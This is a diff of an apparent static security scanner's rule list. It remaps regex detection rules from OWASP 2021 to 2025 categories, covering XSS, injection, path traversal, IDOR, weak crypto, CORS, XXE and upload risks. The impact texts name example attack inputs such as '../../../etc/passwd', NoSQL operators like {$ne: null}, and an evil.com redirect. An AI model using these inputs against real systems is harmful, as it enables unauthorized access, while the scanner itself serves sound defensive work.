-      { re: /res\.(?:send|write|end)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-79', title: 'Reflected XSS — response body from user input', owasp: 'A03:2021-Injection', impact: 'The server sends user input directly back in the HTTP response without sanitization. An attacker can craft a malicious link that, when clicked, executes JavaScript in the victim\'s browser — stealing their session and impersonating them.', ext: ALL },
+      { re: /innerHTML\s*=\s*(?!['"]<)/, sev: 'medium', cwe: 'CWE-79', title: 'innerHTML assignment — DOM XSS risk', owasp: 'A05:2025-Injection', impact: 'Setting innerHTML with untrusted data allows attackers to inject <script> tags that run in victims\' browsers. This can steal login cookies, redirect users to phishing sites, or deface the page. Any user visiting the page could have their account hijacked.', ext: ALL },
+      { re: /dangerouslySetInnerHTML/, sev: 'medium', cwe: 'CWE-79', title: 'React dangerouslySetInnerHTML — XSS risk', owasp: 'A05:2025-Injection', impact: 'React\'s dangerouslySetInnerHTML bypasses React\'s built-in XSS protection. If the content comes from user input, attackers can inject scripts that steal session tokens, log keystrokes, or perform actions as the victim.', ext: ALL },
+      { re: /document\.write\s*\(/, sev: 'low', cwe: 'CWE-79', title: 'document.write — DOM XSS risk', owasp: 'A05:2025-Injection', impact: 'document.write() can inject HTML/JavaScript into the page. If fed untrusted data, attackers can hijack user sessions, deface the page, or redirect victims to malicious sites.', ext: ALL },
+      { re: /v-html\s*=/i, sev: 'medium', cwe: 'CWE-79', title: 'Vue v-html directive — XSS risk', owasp: 'A05:2025-Injection', impact: 'Vue\'s v-html renders raw HTML. If the bound data comes from user input, attackers can inject malicious scripts that execute in every visitor\'s browser.', ext: ALL },
+      { re: /\{\{\{.*\}\}\}/, sev: 'medium', cwe: 'CWE-79', title: 'Handlebars triple-brace (unescaped HTML) — XSS risk', owasp: 'A05:2025-Injection', impact: 'Triple braces {{{ }}} in Handlebars render unescaped HTML. If the variable contains user input, attackers can inject <script> tags that steal cookies and hijack user sessions.', ext: ALL },
+      { re: /res\.(?:send|write|end)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-79', title: 'Reflected XSS — response body from user input', owasp: 'A05:2025-Injection', impact: 'The server sends user input directly back in the HTTP response without sanitization. An attacker can craft a malicious link that, when clicked, executes JavaScript in the victim\'s browser — stealing their session and impersonating them.', ext: ALL },
       // SSTI patterns
-      { re: /render\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'high', cwe: 'CWE-1336', title: 'Server-Side Template Injection (SSTI) risk', owasp: 'A03:2021-Injection', impact: 'User input is passed to a template engine\'s render function. Attackers can inject template syntax (e.g., {{7*7}} in Jinja2, <%= %> in EJS) to execute arbitrary code on the server, read files, and gain full remote code execution.', ext: ALL },
-      { re: /\.render\s*\(\s*template\s*\+\s*/i, sev: 'high', cwe: 'CWE-1336', title: 'Template path concatenated with user input', owasp: 'A03:2021-Injection', impact: 'The template file path is built from user input. Attackers can traverse directories to render arbitrary files or inject template syntax for server-side code execution.', ext: ALL },
+      { re: /render\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'high', cwe: 'CWE-1336', title: 'Server-Side Template Injection (SSTI) risk', owasp: 'A05:2025-Injection', impact: 'User input is passed to a template engine\'s render function. Attackers can inject template syntax (e.g., {{7*7}} in Jinja2, <%= %> in EJS) to execute arbitrary code on the server, read files, and gain full remote code execution.', ext: ALL },
+      { re: /\.render\s*\(\s*template\s*\+\s*/i, sev: 'high', cwe: 'CWE-1336', title: 'Template path concatenated with user input', owasp: 'A05:2025-Injection', impact: 'The template file path is built from user input. Attackers can traverse directories to render arbitrary files or inject template syntax for server-side code execution.', ext: ALL },
       // NoSQL Injection
-      { re: /\.find\s*\(\s*\{[^}]*req\.(?:body|query|params)/, sev: 'high', cwe: 'CWE-943', title: 'NoSQL injection — MongoDB query from user input', owasp: 'A03:2021-Injection', impact: 'MongoDB queries are built from raw user input. Attackers can inject operators like {$gt: ""} or {$ne: null} to bypass authentication, extract all documents, or cause denial of service.', ext: ALL },
-      { re: /\.aggregate\s*\(\s*\[[^\]]*req\.(?:body|query|params)/, sev: 'medium', cwe: 'CWE-943', title: 'NoSQL injection in aggregation pipeline', owasp: 'A03:2021-Injection', impact: 'The MongoDB aggregation pipeline includes user input. Attackers can manipulate the pipeline to bypass access controls and extract data they should not see.', ext: ALL },
+      { re: /\.find\s*\(\s*\{[^}]*req\.(?:body|query|params)/, sev: 'high', cwe: 'CWE-943', title: 'NoSQL injection — MongoDB query from user input', owasp: 'A05:2025-Injection', impact: 'MongoDB queries are built from raw user input. Attackers can inject operators like {$gt: ""} or {$ne: null} to bypass authentication, extract all documents, or cause denial of service.', ext: ALL },
+      { re: /\.aggregate\s*\(\s*\[[^\]]*req\.(?:body|query|params)/, sev: 'medium', cwe: 'CWE-943', title: 'NoSQL injection in aggregation pipeline', owasp: 'A05:2025-Injection', impact: 'The MongoDB aggregation pipeline includes user input. Attackers can manipulate the pipeline to bypass access controls and extract data they should not see.', ext: ALL },
       // LDAP Injection
-      { re: /ldap\.(?:search|query|filter)\s*\([^)]*req\.(?:body|query|params)/, sev: 'high', cwe: 'CWE-90', title: 'LDAP injection — user input in LDAP filter', owasp: 'A03:2021-Injection', impact: 'User input is placed directly in an LDAP query filter. Attackers can inject LDAP metacharacters (*, |, &) to bypass authentication, list all users, or extract sensitive directory information.', ext: ALL },
+      { re: /ldap\.(?:search|query|filter)\s*\([^)]*req\.(?:body|query|params)/, sev: 'high', cwe: 'CWE-90', title: 'LDAP injection — user input in LDAP filter', owasp: 'A05:2025-Injection', impact: 'User input is placed directly in an LDAP query filter. Attackers can inject LDAP metacharacters (*, |, &) to bypass authentication, list all users, or extract sensitive directory information.', ext: ALL },
 
-      // ── A01:2021 — Broken Access Control (IDOR, path traversal, missing authz) ──
-      { re: /(?:readFile|readFileSync|createReadStream|fs\.read|file_get_contents|open\s*\([^)]*\.\.\/)/, sev: 'high', cwe: 'CWE-22', title: 'Path traversal — file read with user input', owasp: 'A01:2021-Broken Access Control', impact: 'An attacker can read arbitrary files from the server by manipulating file paths (e.g., ../../../etc/passwd). This can expose source code, configuration files with database passwords, SSH keys, and system files containing user data.', ext: ALL },
+      // ── A01:2025 — Broken Access Control (IDOR, path traversal, missing authz) ──
+      { re: /(?:readFile|readFileSync|createReadStream|fs\.read|file_get_contents|open\s*\([^)]*\.\.\/)/, sev: 'high', cwe: 'CWE-22', title: 'Path traversal — file read with user input', owasp: 'A01:2025-Broken Access Control', impact: 'An attacker can read arbitrary files from the server by manipulating file paths (e.g., ../../../etc/passwd). This can expose source code, configuration files with database passwords, SSH keys, and system files containing user data.', ext: ALL },
       // Path traversal: only flag ../ outside of import/require statements (skip TS relative imports)
-      { re: /(?:\.\.\/|\.\.\\)/, sev: 'info', cwe: 'CWE-22', title: 'Path traversal sequence in source', owasp: 'A01:2021-Broken Access Control', impact: 'The code contains path traversal sequences. If this path is influenced by user input, attackers can escape the intended directory and read any file on the server.', ext: f => extMatch(f, ['.php', '.py', '.rb', '.java', '.go', '.c', '.cpp', '.sh', '.bat', '.yaml', '.yml', '.env', '.config', '.conf', '.ini', '.toml', '.xml', '.json']) },
-      { re: /(?:app\.(?:get|post|put|delete|patch|use)|router\.(?:get|post|put|delete|patch))\s*\(\s*['"`]\/[^'"`]*\/:(\w+)/, sev: 'low', cwe: 'CWE-639', title: 'IDOR risk — route parameter without authorization check', owasp: 'A01:2021-Broken Access Control', impact: 'The route accepts a resource ID from the URL (e.g., /users/:id) without visible authorization checks. An attacker can change the ID to access other users\' data, private documents, or restricted resources.', ext: ALL },
-      { re: /(?:findById|findOne|findByPk|get\s*\(\s*['"]\/\w+\/\w+['"])\s*\([^)]*req\.params/, sev: 'medium', cwe: 'CWE-639', title: 'IDOR — database lookup by URL param without ownership check', owasp: 'A01:2021-Broken Access Control', impact: 'The application fetches a database record based on a URL parameter without verifying the current user owns that record. An attacker can enumerate IDs to access every user\'s private data.', ext: ALL },
-      { re: /(?:req\.params\.id|req\.query\.id|req\.body\.id)\s*&&\s*!(?:req\.user|req\.session|auth)/, sev: 'medium', cwe: 'CWE-639', title: 'IDOR — uses request ID without authentication guard', owasp: 'A01:2021-Broken Access Control', impact: 'The application uses a user-supplied ID without first checking authentication or authorization. An unauthenticated attacker can access any record by guessing or enumerating IDs.', ext: ALL },
-      { re: /\.(?:role|isAdmin|isManager|isSuperUser)\s*===\s*['"]admin['"]/, sev: 'low', cwe: 'CWE-285', title: 'Hardcoded role check — may be bypassable', owasp: 'A01:2021-Broken Access Control', impact: 'Authorization is checked by comparing a role string. If the role can be manipulated (e.g., via JWT tampering or request modification), attackers can set their role to "admin" and gain full access.', ext: ALL },
-      { re: /res\.redirect\s*\(\s*(?:req\.(?:query|params|body)\.)/, sev: 'medium', cwe: 'CWE-601', title: 'Open redirect — user-controlled redirect target', owasp: 'A01:2021-Broken Access Control', impact: 'The application redirects users to a URL from user input. Attackers can craft phishing links (e.g., /login?redirect=http://evil.com) that appear to come from your domain, tricking users into entering credentials on a fake login page.', ext: ALL },
+      { re: /(?:\.\.\/|\.\.\\)/, sev: 'info', cwe: 'CWE-22', title: 'Path traversal sequence in source', owasp: 'A01:2025-Broken Access Control', impact: 'The code contains path traversal sequences. If this path is influenced by user input, attackers can escape the intended directory and read any file on the server.', ext: f => extMatch(f, ['.php', '.py', '.rb', '.java', '.go', '.c', '.cpp', '.sh', '.bat', '.yaml', '.yml', '.env', '.config', '.conf', '.ini', '.toml', '.xml', '.json']) },
+      { re: /(?:app\.(?:get|post|put|delete|patch|use)|router\.(?:get|post|put|delete|patch))\s*\(\s*['"`]\/[^'"`]*\/:(\w+)/, sev: 'low', cwe: 'CWE-639', title: 'IDOR risk — route parameter without authorization check', owasp: 'A01:2025-Broken Access Control', impact: 'The route accepts a resource ID from the URL (e.g., /users/:id) without visible authorization checks. An attacker can change the ID to access other users\' data, private documents, or restricted resources.', ext: ALL },
+      { re: /(?:findById|findOne|findByPk|get\s*\(\s*['"]\/\w+\/\w+['"])\s*\([^)]*req\.params/, sev: 'medium', cwe: 'CWE-639', title: 'IDOR — database lookup by URL param without ownership check', owasp: 'A01:2025-Broken Access Control', impact: 'The application fetches a database record based on a URL parameter without verifying the current user owns that record. An attacker can enumerate IDs to access every user\'s private data.', ext: ALL },
+      { re: /(?:req\.params\.id|req\.query\.id|req\.body\.id)\s*&&\s*!(?:req\.user|req\.session|auth)/, sev: 'medium', cwe: 'CWE-639', title: 'IDOR — uses request ID without authentication guard', owasp: 'A01:2025-Broken Access Control', impact: 'The application uses a user-supplied ID without first checking authentication or authorization. An unauthenticated attacker can access any record by guessing or enumerating IDs.', ext: ALL },
+      { re: /\.(?:role|isAdmin|isManager|isSuperUser)\s*===\s*['"]admin['"]/, sev: 'low', cwe: 'CWE-285', title: 'Hardcoded role check — may be bypassable', owasp: 'A01:2025-Broken Access Control', impact: 'Authorization is checked by comparing a role string. If the role can be manipulated (e.g., via JWT tampering or request modification), attackers can set their role to "admin" and gain full access.', ext: ALL },
+      { re: /res\.redirect\s*\(\s*(?:req\.(?:query|params|body)\.)/, sev: 'medium', cwe: 'CWE-601', title: 'Open redirect — user-controlled redirect target', owasp: 'A01:2025-Broken Access Control', impact: 'The application redirects users to a URL from user input. Attackers can craft phishing links (e.g., /login?redirect=http://evil.com) that appear to come from your domain, tricking users into entering credentials on a fake login page.', ext: ALL },
 
-      // ── A02:2021 — Cryptographic Failures ──
-      { re: /md5|sha1(?!256|512)/i, sev: 'low', cwe: 'CWE-327', title: 'Weak hash algorithm (MD5/SHA1)', owasp: 'A02:2021-Cryptographic Failures', impact: 'MD5 and SHA1 are cryptographically broken — attackers can generate collisions (two different inputs that produce the same hash) in seconds. Anyone with access to the hashed data can crack it with freely available tools.', ext: ALL },
-      { re: /createHash\s*\(\s*['"]md5['"]\s*\)/, sev: 'medium', cwe: 'CWE-327', title: 'MD5 used for hashing', owasp: 'A02:2021-Cryptographic Failures', impact: 'MD5 is explicitly used for hashing. MD5 collisions can be generated in under a second on modern hardware. Any password hashed with MD5 is effectively unprotected.', ext: ALL },
-      { re: /Math\.random\s*\(\s*\)/, sev: 'low', cwe: 'CWE-338', title: 'Math.random() — not cryptographically secure', owasp: 'A02:2021-Cryptographic Failures', impact: 'Math.random() is predictable and should never be used for security purposes (tokens, passwords, session IDs). Attackers can predict the "random" values and hijack sessions or reset tokens.', ext: ALL },
-      { re: /jwt\.(?:verify|decode)\s*\([^)]*algorithms?\s*:\s*\[[^\]]*none/i, sev: 'critical', cwe: 'CWE-347', title: 'JWT "none" algorithm accepted', owasp: 'A02:2021-Cryptographic Failures', impact: 'The JWT library accepts tokens signed with the "none" algorithm (no signature). An attacker can forge a token with any user ID and role — including admin — and the server will accept it as valid. This is a complete authentication bypass.', ext: ALL },
-      { re: /(?:http:\/\/|\bhttp\b)(?!.*localhost)/i, sev: 'low', cwe: 'CWE-319', title: 'HTTP (cleartext) used — no TLS encryption', owasp: 'A02:2021-Cryptographic Failures', impact: 'Data is transmitted over unencrypted HTTP. Anyone on the same network (coffee shop WiFi, compromised router) can read all traffic — including passwords, session tokens, and personal data — in plain text.', ext: ALL },
-      { re: /(?:crypto\.createCipher|crypto\.createCipheriv)\s*\(\s*['"](?:des|rc4|bf|blowfish)/, sev: 'high', cwe: 'CWE-327', title: 'Broken cipher (DES/RC4/Blowfish) used for encryption', owasp: 'A02:2021-Cryptographic Failures', impact: 'DES and RC4 are trivially breakable — DES keys can be brute-forced in hours. Any data encrypted with these ciphers should be considered compromised. An attacker who intercepts the encrypted data can decrypt it.', ext: ALL },
+      // ── A04:2025 — Cryptographic Failures ──
+      { re: /md5|sha1(?!256|512)/i, sev: 'low', cwe: 'CWE-327', title: 'Weak hash algorithm (MD5/SHA1)', owasp: 'A04:2025-Cryptographic Failures', impact: 'MD5 and SHA1 are cryptographically broken — attackers can generate collisions (two different inputs that produce the same hash) in seconds. Anyone with access to the hashed data can crack it with freely available tools.', ext: ALL },
+      { re: /createHash\s*\(\s*['"]md5['"]\s*\)/, sev: 'medium', cwe: 'CWE-327', title: 'MD5 used for hashing', owasp: 'A04:2025-Cryptographic Failures', impact: 'MD5 is explicitly used for hashing. MD5 collisions can be generated in under a second on modern hardware. Any password hashed with MD5 is effectively unprotected.', ext: ALL },
+      { re: /Math\.random\s*\(\s*\)/, sev: 'low', cwe: 'CWE-338', title: 'Math.random() — not cryptographically secure', owasp: 'A04:2025-Cryptographic Failures', impact: 'Math.random() is predictable and should never be used for security purposes (tokens, passwords, session IDs). Attackers can predict the "random" values and hijack sessions or reset tokens.', ext: ALL },
+      { re: /jwt\.(?:verify|decode)\s*\([^)]*algorithms?\s*:\s*\[[^\]]*none/i, sev: 'critical', cwe: 'CWE-347', title: 'JWT "none" algorithm accepted', owasp: 'A04:2025-Cryptographic Failures', impact: 'The JWT library accepts tokens signed with the "none" algorithm (no signature). An attacker can forge a token with any user ID and role — including admin — and the server will accept it as valid. This is a complete authentication bypass.', ext: ALL },
+      { re: /(?:http:\/\/|\bhttp\b)(?!.*localhost)/i, sev: 'low', cwe: 'CWE-319', title: 'HTTP (cleartext) used — no TLS encryption', owasp: 'A04:2025-Cryptographic Failures', impact: 'Data is transmitted over unencrypted HTTP. Anyone on the same network (coffee shop WiFi, compromised router) can read all traffic — including passwords, session tokens, and personal data — in plain text.', ext: ALL },
+      { re: /(?:crypto\.createCipher|crypto\.createCipheriv)\s*\(\s*['"](?:des|rc4|bf|blowfish)/, sev: 'high', cwe: 'CWE-327', title: 'Broken cipher (DES/RC4/Blowfish) used for encryption', owasp: 'A04:2025-Cryptographic Failures', impact: 'DES and RC4 are trivially breakable — DES keys can be brute-forced in hours. Any data encrypted with these ciphers should be considered compromised. An attacker who intercepts the encrypted data can decrypt it.', ext: ALL },
 
-      // ── A04:2021 — Insecure Design ──
-      { re: /(?:rate.limit|throttle|maxAttempts|max_attempts)/i, sev: 'info', cwe: 'CWE-307', title: 'Rate limiting may be insufficient', owasp: 'A04:2021-Insecure Design', impact: 'Without proper rate limiting, attackers can brute-force passwords, API keys, or 2FA codes by trying thousands of combinations per second. An account with a weak password can be compromised in minutes.', ext: ALL },
-      { re: /(?:password|passwd|pwd)\s*=\s*['"][^'"]{1,5}['"]/, sev: 'medium', cwe: 'CWE-521', title: 'Weak/default password in source code', owasp: 'A04:2021-Insecure Design', impact: 'A very short or default password is hardcoded. Attackers can guess it in seconds. If this is a production credential, the system is effectively unprotected.', ext: ALL },
-      { re: /(?:password|passwd)\s*[:=]\s*['"](?:admin|password|123456|test|guest|qwerty)/i, sev: 'high', cwe: 'CWE-521', title: 'Known default password in source', owasp: 'A04:2021-Insecure Design', impact: 'A well-known default password (admin, password, 123456) is in the source code. These are the first passwords any attacker tries. If deployed, the application is immediately compromised.', ext: ALL },
+      // ── A06:2025 — Insecure Design ──
+      { re: /(?:rate.limit|throttle|maxAttempts|max_attempts)/i, sev: 'info', cwe: 'CWE-307', title: 'Rate limiting may be insufficient', owasp: 'A06:2025-Insecure Design', impact: 'Without proper rate limiting, attackers can brute-force passwords, API keys, or 2FA codes by trying thousands of combinations per second. An account with a weak password can be compromised in minutes.', ext: ALL },
+      { re: /(?:password|passwd|pwd)\s*=\s*['"][^'"]{1,5}['"]/, sev: 'medium', cwe: 'CWE-521', title: 'Weak/default password in source code', owasp: 'A06:2025-Insecure Design', impact: 'A very short or default password is hardcoded. Attackers can guess it in seconds. If this is a production credential, the system is effectively unprotected.', ext: ALL },
+      { re: /(?:password|passwd)\s*[:=]\s*['"](?:admin|password|123456|test|guest|qwerty)/i, sev: 'high', cwe: 'CWE-521', title: 'Known default password in source', owasp: 'A06:2025-Insecure Design', impact: 'A well-known default password (admin, password, 123456) is in the source code. These are the first passwords any attacker tries. If deployed, the application is immediately compromised.', ext: ALL },
 
-      // ── A05:2021 — Security Misconfiguration (CORS, debug, XXE, file upload) ──
-      { re: /cors\s*\(\s*\{?\s*origin\s*:\s*(?:true|['"]\*['"])/i, sev: 'medium', cwe: 'CWE-942', title: 'Permissive CORS (origin: *)', owasp: 'A05:2021-Security Misconfiguration', impact: 'CORS is configured to allow ANY website to make requests to your API. While credentials are not sent, any public data can be read by malicious sites. Combined with other vulnerabilities, this can enable cross-origin attacks.', ext: ALL },
-      { re: /Access-Control-Allow-Origin['"]?\s*[:,]\s*['"]\*['"]/, sev: 'medium', cwe: 'CWE-942', title: 'Wildcard CORS header', owasp: 'A05:2021-Security Misconfiguration', impact: 'The server explicitly allows any origin. Malicious websites can read API responses in the victim\'s browser context, potentially leaking sensitive data.', ext: ALL },
-      { re: /app\.use\s*\(\s*['"]\/(?:debug|test|dev)/i, sev: 'low', cwe: 'CWE-489', title: 'Debug/test route mounted', owasp: 'A05:2021-Security Misconfiguration', impact: 'Debug or test routes are exposed in production. These often bypass authentication, leak internal state, or expose sensitive configuration. Attackers can use these to understand the application internals.', ext: ALL },
-      { re: /(?:debug|DEBUG)\s*=\s*(?:true|1|['"]on['"])/i, sev: 'medium', cwe: 'CWE-489', title: 'Debug mode enabled in production', owasp: 'A05:2021-Security Misconfiguration', impact: 'Debug mode is ON. Error pages will show full stack traces with file paths, database queries, and environment details. This is a goldmine for attackers — it reveals the exact technology stack, internal paths, and sometimes credentials.', ext: ALL },
+      // ── A02:2025 — Security Misconfiguration (CORS, debug, XXE, file upload) ──
+      { re: /cors\s*\(\s*\{?\s*origin\s*:\s*(?:true|['"]\*['"])/i, sev: 'medium', cwe: 'CWE-942', title: 'Permissive CORS (origin: *)', owasp: 'A02:2025-Security Misconfiguration', impact: 'CORS is configured to allow ANY website to make requests to your API. While credentials are not sent, any public data can be read by malicious sites. Combined with other vulnerabilities, this can enable cross-origin attacks.', ext: ALL },
+      { re: /Access-Control-Allow-Origin['"]?\s*[:,]\s*['"]\*['"]/, sev: 'medium', cwe: 'CWE-942', title: 'Wildcard CORS header', owasp: 'A02:2025-Security Misconfiguration', impact: 'The server explicitly allows any origin. Malicious websites can read API responses in the victim\'s browser context, potentially leaking sensitive data.', ext: ALL },
+      { re: /app\.use\s*\(\s*['"]\/(?:debug|test|dev)/i, sev: 'low', cwe: 'CWE-489', title: 'Debug/test route mounted', owasp: 'A02:2025-Security Misconfiguration', impact: 'Debug or test routes are exposed in production. These often bypass authentication, leak internal state, or expose sensitive configuration. Attackers can use these to understand the application internals.', ext: ALL },
+      { re: /(?:debug|DEBUG)\s*=\s*(?:true|1|['"]on['"])/i, sev: 'medium', cwe: 'CWE-489', title: 'Debug mode enabled in production', owasp: 'A02:2025-Security Misconfiguration', impact: 'Debug mode is ON. Error pages will show full stack traces with file paths, database queries, and environment details. This is a goldmine for attackers — it reveals the exact technology stack, internal paths, and sometimes credentials.', ext: ALL },
       // XXE patterns (Java/PHP only)
-      { re: /xml\.(?:parse|Parse|load|Load|DOM)/, sev: 'medium', cwe: 'CWE-611', title: 'XML parsing without XXE protection', owasp: 'A05:2021-Security Misconfiguration', impact: 'XML is parsed without disabling external entities. Attackers can send a crafted XML document that reads local files (/etc/passwd), performs SSRF to internal services, or causes denial of service (Billion Laughs attack).', ext: f => extMatch(f, ['.java', '.php', '.py', '.rb']) },
-      { re: /(?:DocumentBuilder|SAXParser|XMLInputFactory|SAXReader|XMLReader)\s*\.\s*new/, sev: 'medium', cwe: 'CWE-611', title: 'Java XML parser — potential XXE', owasp: 'A05:2021-Security Misconfiguration', impact: 'Java XML parsers are vulnerable to XXE by default. Attackers can read arbitrary files from the server, perform SSRF, or cause denial of service through crafted XML input.', ext: f => extMatch(f, ['.java']) },
-      { re: /(?:libxml|simplexml_load_string|DOMDocument)\s*\(/, sev: 'medium', cwe: 'CWE-611', title: 'PHP XML parsing — potential XXE', owasp: 'A05:2021-Security Misconfiguration', impact: 'PHP\'s XML functions load external entities by default. Attackers can read /etc/passwd, access internal services, or cause DoS through XML entity expansion.', ext: f => extMatch(f, ['.php']) },
+      { re: /xml\.(?:parse|Parse|load|Load|DOM)/, sev: 'medium', cwe: 'CWE-611', title: 'XML parsing without XXE protection', owasp: 'A02:2025-Security Misconfiguration', impact: 'XML is parsed without disabling external entities. Attackers can send a crafted XML document that reads local files (/etc/passwd), performs SSRF to internal services, or causes denial of service (Billion Laughs attack).', ext: f => extMatch(f, ['.java', '.php', '.py', '.rb']) },
+      { re: /(?:DocumentBuilder|SAXParser|XMLInputFactory|SAXReader|XMLReader)\s*\.\s*new/, sev: 'medium', cwe: 'CWE-611', title: 'Java XML parser — potential XXE', owasp: 'A02:2025-Security Misconfiguration', impact: 'Java XML parsers are vulnerable to XXE by default. Attackers can read arbitrary files from the server, perform SSRF, or cause denial of service through crafted XML input.', ext: f => extMatch(f, ['.java']) },
+      { re: /(?:libxml|simplexml_load_string|DOMDocument)\s*\(/, sev: 'medium', cwe: 'CWE-611', title: 'PHP XML parsing — potential XXE', owasp: 'A02:2025-Security Misconfiguration', impact: 'PHP\'s XML functions load external entities by default. Attackers can read /etc/passwd, access internal services, or cause DoS through XML entity expansion.', ext: f => extMatch(f, ['.php']) },
       // File upload patterns
-      { re: /(?:multer|upload|file_put_contents|move_uploaded_file|saveUploadedFile)\s*\(/, sev: 'medium', cwe: 'CWE-434', title: 'File upload without visible validation', owasp: 'A05:2021-Security Misconfiguration', impact: 'File upload functionality exists without visible file type or content validation. An attacker can upload a malicious script (e.g., shell.php, malware.exe) and execute it on the server. This can lead to complete server takeover.', ext: ALL },
-      { re: /(?:multer|upload|file_put_contents|move_uploaded_file|saveUploadedFile)\s*\([^)]*req\.(?:file|files)/, sev: 'high', cwe: 'CWE-434', title: 'Unrestricted file upload — user file saved directly', owasp: 'A05:2021-Security Misconfiguration', impact: 'User-uploaded files are saved to the server without checking the file type, content, or extension. Attackers can upload a web shell (e.g., .php, .jsp, .aspx) and execute arbitrary commands on the server through a browser — this is remote code execution.', ext: ALL },
-      { re: /(?:\.png|\.jpg|\.jpeg|\.gif|\.svg|\.bmp|\.webp|\.ico)/i, sev: 'info', cwe: 'CWE-434', title: 'Image upload/handling — check for SVG XSS and ImageTragick', owasp: 'A05:2021-Security Misconfiguration', impact: 'Image uploads can be dangerous. SVG files can contain embedded JavaScript (XSS). Image processing libraries like ImageMagick have had critical RCE vulnerabilities (ImageTragick). Ensure uploaded files are re-encoded, not just validated by extension.', ext: ALL },
-      { re: /(?:\.exe|\.dll|\.so|\.sh|\.bat|\.cmd|\.ps1|\.vbs|\.jar|\.war|\.php|\.jsp|\.asp|\.aspx|\.py|\.pl|\.rb|\.cgi)/i, sev: 'high', cwe: 'CWE-434', title: 'Potentially executable file extension in upload logic', owasp: 'A05:2021-Security Misconfiguration', impact: 'The code references executable file extensions (.exe, .php, .jsp, etc.) in upload logic. If these extensions are allowed, attackers can upload and execute arbitrary code on the server. Only allow strictly necessary file types (e.g., .pdf, .png after re-encoding).', ext: ALL },
+      { re: /(?:multer|upload|file_put_contents|move_uploaded_file|saveUploadedFile)\s*\(/, sev: 'medium', cwe: 'CWE-434', title: 'File upload without visible validation', owasp: 'A02:2025-Security Misconfiguration', impact: 'File upload functionality exists without visible file type or content validation. An attacker can upload a malicious script (e.g., shell.php, malware.exe) and execute it on the server. This can lead to complete server takeover.', ext: ALL },
+      { re: /(?:multer|upload|file_put_contents|move_uploaded_file|saveUploadedFile)\s*\([^)]*req\.(?:file|files)/, sev: 'high', cwe: 'CWE-434', title: 'Unrestricted file upload — user file saved directly', owasp: 'A02:2025-Security Misconfiguration', impact: 'User-uploaded files are saved to the server without checking the file type, content, or extension. Attackers can upload a web shell (e.g., .php, .jsp, .aspx) and execute arbitrary commands on the server through a browser — this is remote code execution.', ext: ALL },
+      { re: /(?:\.png|\.jpg|\.jpeg|\.gif|\.svg|\.bmp|\.webp|\.ico)/i, sev: 'info', cwe: 'CWE-434', title: 'Image upload/handling — check for SVG XSS and ImageTragick', owasp: 'A02:2025-Security Misconfiguration', impact: 'Image uploads can be dangerous. SVG files can contain embedded JavaScript (XSS). Image processing libraries like ImageMagick have had critical RCE vulnerabilities (ImageTragick). Ensure uploaded files are re-encoded, not just validated by extension.', ext: ALL },
+      { re: /(?:\.exe|\.dll|\.so|\.sh|\.bat|\.cmd|\.ps1|\.vbs|\.jar|\.war|\.php|\.jsp|\.asp|\.aspx|\.py|\.pl|\.rb|\.cgi)/i, sev: 'high', cwe: 'CWE-434', title: 'Potentially executable file extension in upload logic', owasp: 'A02:2025-Security Misconfiguration', impact: 'The code references executable file extensions (.exe, .php, .jsp, etc.) in upload logic. If these extensions are allowed, attackers can upload and execute arbitrary code on the server. Only allow strictly necessary file types (e.g., .pdf, .png after re-encoding).', ext: ALL },
 
-      // ── A06:2021 — Vulnerable and Outdated Components ──
-      { re: /"(?:express|koa|hapi|fastify|next|nuxt|react|angular|vue|jquery|bootstrap|spring|django|flask|rails|laravel|symfony|wordpress|drupal|joomla|struts|tomcat|nginx|apache)":\s*"[~^]?\d+\.\d+\.\d+/i, sev: 'info', cwe: 'CWE-1104', title: 'Dependency version in package.json/composer.json', owasp: 'A06:2021-Vulnerable and Outdated Components', impact: 'The dependency version is pinned. If this version is outdated, it may contain known vulnerabilities with public exploits. Attackers can use automated scanners to find and exploit these known weaknesses.', ext: ALL },
+      // ── A03:2025 — Software Supply Chain Failures ──
+      { re: /"(?:express|koa|hapi|fastify|next|nuxt|react|angular|vue|jquery|bootstrap|spring|django|flask|rails|laravel|symfony|wordpress|drupal|joomla|struts|tomcat|nginx|apache)":\s*"[~^]?\d+\.\d+\.\d+/i, sev: 'info', cwe: 'CWE-1104', title: 'Dependency version in package.json/composer.json', owasp: 'A03:2025-Software Supply Chain Failures', impact: 'The dependency version is pinned. If this version is outdated, it may contain known vulnerabilities with public exploits. Attackers can use automated scanners to find and exploit these known weaknesses.', ext: ALL },
 
-      // ── A07:2021 — Identification and Authentication Failures ──
-      { re: /(?:session|token|jwt).?(?:secret|key)\s*[:=]\s*['"][^'"]{1,20}['"]/i, sev: 'high', cwe: 'CWE-798', title: 'Weak session/JWT secret key', owasp: 'A07:2021-Identification and Authentication Failures', impact: 'The session signing secret is too short or hardcoded. Attackers can brute-force it to forge valid session tokens for any user, including administrators. This bypasses the entire authentication system.', ext: ALL },
-      { re: /(?:login|signin|authenticate|auth)\s*\([^)]*\)\s*{?\s*[^}]{0,100}?\btrue\b/, sev: 'medium', cwe: 'CWE-287', title: 'Authentication returning true without visible validation', owasp: 'A07:2021-Identification and Authentication Failures', impact: 'The login function appears to return success without proper credential validation. This could mean the authentication is bypassable or the validation is missing entirely.', ext: ALL },
+      // ── A07:2025 — Authentication Failures ──
+      { re: /(?:session|token|jwt).?(?:secret|key)\s*[:=]\s*['"][^'"]{1,20}['"]/i, sev: 'high', cwe: 'CWE-798', title: 'Weak session/JWT secret key', owasp: 'A07:2025-Authentication Failures', impact: 'The session signing secret is too short or hardcoded. Attackers can brute-force it to forge valid session tokens for any user, including administrators. This bypasses the entire authentication system.', ext: ALL },
+      { re: /(?:login|signin|authenticate|auth)\s*\([^)]*\)\s*{?\s*[^}]{0,100}?\btrue\b/, sev: 'medium', cwe: 'CWE-287', title: 'Authentication returning true without visible validation', owasp: 'A07:2025-Authentication Failures', impact: 'The login function appears to return success without proper credential validation. This could mean the authentication is bypassable or the validation is missing entirely.', ext: ALL },
 
-      // ── A08:2021 — Software and Data Integrity Failures ──
